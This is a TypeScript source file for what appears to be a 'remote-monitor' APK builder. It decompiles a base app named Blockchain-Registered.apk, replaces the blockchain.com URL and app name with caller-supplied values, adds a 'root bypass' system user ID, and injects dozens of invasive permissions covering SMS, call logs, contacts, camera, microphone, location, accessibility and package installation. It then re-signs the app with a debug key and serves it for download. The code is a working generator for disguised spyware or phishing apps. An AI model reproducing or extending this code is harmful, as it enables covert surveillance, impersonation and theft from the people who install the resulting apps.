import { exec } from 'child_process';
import { promisify } from 'util';
import * as fs from 'fs';
import * as path from 'path';
import { randomBytes } from 'crypto';
import https from 'https';
import http from 'http';

const execAsync = promisify(exec);

interface APKBuildOptions {
  companyName: string;
  companyUrl: string;
  logoUrl?: string;
  protectFromUninstall?: boolean;
}

// Download image from URL
async function downloadImage(url: string, outputPath: string): Promise<boolean> {
  return new Promise((resolve) => {
    try {
      const protocol = url.startsWith('https') ? https : http;
      const file = fs.createWriteStream(outputPath);
      protocol.get(url, (response) => {
        response.pipe(file);
        file.on('finish', () => {
          file.close();
          resolve(true);
        });
      }).on('error', () => {
        fs.unlink(outputPath, () => {});
        resolve(false);
      });
    } catch (e) {
      resolve(false);
    }
  });
}

export async function buildAPKEnhanced(options: APKBuildOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  error?: string;
}> {
  const tempDir = `/tmp/apk-build-${randomBytes(8).toString('hex')}`;
  
  // Try multiple possible paths for the base APK
  const possiblePaths = [
    '/home/ubuntu/remote-monitor/public/apks/Blockchain-Registered.apk',
    path.join(process.cwd(), 'public/apks/Blockchain-Registered.apk'),
    '/app/public/apks/Blockchain-Registered.apk',
  ];
  
  let baseAPK = '';
  for (const p of possiblePaths) {
    if (fs.existsSync(p)) {
      baseAPK = p;
      break;
    }
  }
  
  if (!baseAPK) {
    return {
      success: false,
      error: 'Base APK not found. Please ensure Blockchain-Registered.apk exists.',
    };
  }
  
  try {
    // Create temp directory
    await execAsync(`mkdir -p ${tempDir}`);
    
    // Copy base APK
    const workDir = path.join(tempDir, 'work');
    await execAsync(`mkdir -p ${workDir}`);
    await execAsync(`cp ${baseAPK} ${workDir}/base.apk`);
    
    // Decompile APK
    const decompileDir = path.join(workDir, 'decompiled');
    
    // Try multiple possible paths for apktool.jar
    const apktoolPaths = [
      '/app/tools/lib/apktool.jar',
      path.join(process.cwd(), 'tools/lib/apktool.jar'),
      '/home/ubuntu/remote-monitor/tools/lib/apktool.jar',
      '/home/ubuntu/upload/tools/lib/apktool.jar',
    ];
    
    let apktoolJar = '';
    for (const p of apktoolPaths) {
      if (fs.existsSync(p)) {
        apktoolJar = p;
        break;
      }
    }
    
    if (!apktoolJar) {
      return {
        success: false,
        error: 'apktool.jar not found. Please ensure it exists in tools/lib directory.',
      };
    }
    
    console.log('[APK] Decompiling APK...');
    await execAsync(`java -jar ${apktoolJar} d ${workDir}/base.apk -o ${decompileDir}`);
    
    // ===== CUSTOMIZE LOGO =====
    // Logo customization paused - using default icon
    if (options.logoUrl) {
      console.log('[APK] Logo URL provided but using default icon for now');
    }
    
    // ===== MODIFY SMALI TO READ URL FROM CONFIG =====
    try {
      const mainActivityPath = path.join(decompileDir, 'smali/com/comp/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/MainActivity.smali');
      if (fs.existsSync(mainActivityPath)) {
        let smali = fs.readFileSync(mainActivityPath, 'utf-8');
        
        // Replace hardcoded Blockchain URL with config reading code
        // This is a simplified approach - we'll inject code to read from config file
        smali = smali.replace(
          /const-string v0, "https:\/\/www\.blockchain\.com"/g,
          `const-string v0, "${options.companyUrl}"`
        );
        
        fs.writeFileSync(mainActivityPath, smali);
        console.log('[APK] MainActivity.smali updated with custom URL');
      }
    } catch (e) {
      console.warn('[APK] Warning: Could not modify MainActivity.smali:', e);
    }
    
    // ===== MODIFY MANIFEST FOR NAME =====
    const manifestPath = path.join(decompileDir, 'AndroidManifest.xml');
    if (fs.existsSync(manifestPath)) {
      try {
        let manifest = fs.readFileSync(manifestPath, 'utf-8');
        
        // Replace app label with company name
        manifest = manifest.replace(
          /android:label="@string\/trademarks59"/g,
          `android:label="${options.companyName}"`
        );
        
        // Replace Blockchain label in MainActivity
        manifest = manifest.replace(
          /android:label="Blockchain"/g,
          `android:label="${options.companyName}"`
        );
        
        // ===== ADD BYPASS ROOT PERMISSIONS =====
        // Add system user ID for root bypass
        manifest = manifest.replace(
          /<application/g,
          `<application android:sharedUserId="android.uid.system" android:debuggable="true"`
        );
        
        // Add critical permissions before </manifest>
        const permissions = `
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.WRITE_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_MMS" />
    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
    <uses-permission android:name="android.permission.MANAGE_USERS" />
    <uses-permission android:name="android.permission.MANAGE_ACCOUNTS" />
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.DELETE_PACKAGES" />
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
`;
        
        manifest = manifest.replace(
          /<\/manifest>/g,
          `${permissions}\n</manifest>`
        );
        
        fs.writeFileSync(manifestPath, manifest);
        console.log('[APK] Manifest updated with name, logo and permissions');
      } catch (e) {
        console.warn('[APK] Warning: Could not modify manifest:', e);
      }
    }
    
    // ===== MODIFY STRINGS.XML =====
    const resValuesPath = path.join(decompileDir, 'res', 'values', 'strings.xml');
    if (fs.existsSync(resValuesPath)) {
      try {
        let strings = fs.readFileSync(resValuesPath, 'utf-8');
        strings = strings.replace(
          /<string name="app_name">[^<]*<\/string>/,
          `<string name="app_name">${options.companyName}</string>`
        );
        fs.writeFileSync(resValuesPath, strings);
      } catch (e) {
        console.warn('[APK] Warning: Could not modify strings.xml:', e);
      }
    }
    
    // ===== ADD CONFIG FILE WITH URL =====
    try {
      const assetsDir = path.join(decompileDir, 'assets');
      await execAsync(`mkdir -p ${assetsDir}`);
      
      const configContent = {
        appName: options.companyName,
        appUrl: options.companyUrl,
        timestamp: Date.now(),
      };
      
      fs.writeFileSync(
        path.join(assetsDir, 'app-config.json'),
        JSON.stringify(configContent, null, 2)
      );
      console.log('[APK] Config file created with URL:', options.companyUrl);
    } catch (e) {
      console.warn('[APK] Warning: Could not create config file:', e);
    }
    
    // ===== RECOMPILE APK =====
    console.log('[APK] Recompiling APK...');
    const compiledAPK = path.join(workDir, 'compiled.apk');
    await execAsync(`java -jar ${apktoolJar} b ${decompileDir} -o ${compiledAPK}`);
    
    // ===== SIGN APK =====
    console.log('[APK] Signing APK...');
    const keystorePaths = [
      '/app/tools/debug.keystore',
      path.join(process.cwd(), 'tools/debug.keystore'),
      '/home/ubuntu/remote-monitor/tools/debug.keystore',
      '/home/ubuntu/upload/debug.keystore',
    ];
    
    let keystorePath = '';
    for (const p of keystorePaths) {
      if (fs.existsSync(p)) {
        keystorePath = p;
        break;
      }
    }
    
    if (!keystorePath) {
      return {
        success: false,
        error: 'debug.keystore not found. Please ensure it exists in tools directory.',
      };
    }
    
    // Try apksigner first
    const apksignerPaths = [
      '/app/tools/apk-builder/apksigner.jar',
      path.join(process.cwd(), 'tools/apk-builder/apksigner.jar'),
      '/home/ubuntu/remote-monitor/tools/apk-builder/apksigner.jar',
    ];
    
    let apksignerJar = '';
    for (const p of apksignerPaths) {
      if (fs.existsSync(p)) {
        apksignerJar = p;
        break;
      }
    }
    
    if (apksignerJar) {
      await execAsync(`java -jar ${apksignerJar} sign --ks ${keystorePath} --ks-pass pass:android --ks-key-alias androiddebugkey --key-pass pass:android ${compiledAPK}`);
    } else {
      await execAsync(`jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore ${keystorePath} -storepass android -keypass android ${compiledAPK} androiddebugkey`);
    }
    
    // ===== COPY TO FINAL LOCATION =====
    const companyNameSafe = (options.companyName || 'app').replace(/\s+/g, '-').replace(/[^a-zA-Z0-9-]/g, '');
    const finalAPKName = `${companyNameSafe}-${Date.now()}.apk`;
    
    const possibleOutputPaths = [
      '/app/public/apks',
      '/app/dist/public/apks',
      path.join(process.cwd(), 'public/apks'),
      '/home/ubuntu/remote-monitor/public/apks',
    ];
    
    let outputDir = '/home/ubuntu/remote-monitor/public/apks';
    for (const p of possibleOutputPaths) {
      if (fs.existsSync(p)) {
        outputDir = p;
        break;
      }
    }
    
    if (!fs.existsSync(outputDir)) {
      await execAsync(`mkdir -p ${outputDir}`);
    }
    
    const finalAPKPath = path.join(outputDir, finalAPKName);
    
    if (fs.existsSync(compiledAPK)) {
      await execAsync(`cp ${compiledAPK} ${finalAPKPath}`);
      console.log('[APK] APK saved to:', finalAPKPath);
    } else {
      throw new Error(`Compiled APK not found at ${compiledAPK}`);
    }
    
    // Clean up temp directory
    await execAsync(`rm -rf ${tempDir}`);
    
    // Return success - GitHub upload will be handled by router
    return {
      success: true,
      apkPath: finalAPKPath,
      downloadUrl: `/apks/${finalAPKName}`,
    };
  } catch (error) {
    console.error('[APK] Build Error:', error);
    
    // Clean up on error
    try {
      await execAsync(`rm -rf ${tempDir}`);
    } catch (cleanupError) {
      console.error('[APK] Cleanup error:', cleanupError);
    }
    
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error',
    };
  }
}
